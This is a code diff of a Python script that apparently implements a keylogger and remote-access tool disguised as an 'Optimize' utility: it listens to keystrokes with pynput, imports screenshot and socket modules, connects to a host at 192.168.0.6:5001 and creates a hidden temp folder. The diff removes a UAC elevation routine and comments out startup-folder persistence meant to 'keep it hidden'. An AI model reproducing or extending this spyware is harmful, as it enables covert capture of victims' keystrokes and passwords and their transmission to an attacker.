@@ -1,33 +1,11 @@
-import sys
 import os
 import pyautogui
 import socket
-import winshell
 from threading import Thread
 import struct
-from win32com.client import Dispatch
 from pynput import keyboard
 import time
-import ctypes
-def is_admin():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
 
-
-def relaunch_as_admin():
-    ctypes.windll.shell32.ShellExecuteW(
-        None,
-        "runas",
-        sys.executable,
-        "main.py",
-        None,
-        1
-    )
-    sys.exit()
-if not is_admin():
-    relaunch_as_admin()
 os.makedirs(r"C:\Windows\Temp\Optimize", exist_ok=True)
 HOST = "192.168.0.6"
 PORT = 5001
@@ -65,22 +43,22 @@ def on_press(key):
 def on_release(key):
     pass
 
-shell = Dispatch('WScript.Shell')
+# shell = Dispatch('WScript.Shell')
 
-if getattr(sys, 'frozen', False):
-    script_path = sys.executable
-else:
-    # Running as script
-    script_path = os.path.abspath(__file__)
-script_dir = os.path.dirname(script_path)
-# Create shortcut on desktop
-shortcut_path = os.path.join(winshell.startup(), "Optimize.lnk")
-shortcut = shell.CreateShortCut(shortcut_path)
-# Use pythonw to keep it hidden
-shortcut.Targetpath = script_path
-shortcut.Arguments = ""
-shortcut.WorkingDirectory = script_dir
-shortcut.save()
+# if getattr(sys, 'frozen', False):
+#     script_path = sys.executable
+# else:
+#     # Running as script
+#     script_path = os.path.abspath(__file__)
+# script_dir = os.path.dirname(script_path)
+# # Create shortcut on desktop
+# shortcut_path = os.path.join(winshell.startup(), "Optimize.lnk")
+# shortcut = shell.CreateShortCut(shortcut_path)
+# # Use pythonw to keep it hidden
+# shortcut.Targetpath = script_path
+# shortcut.Arguments = ""
+# shortcut.WorkingDirectory = script_dir
+# shortcut.save()
 def listen():
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
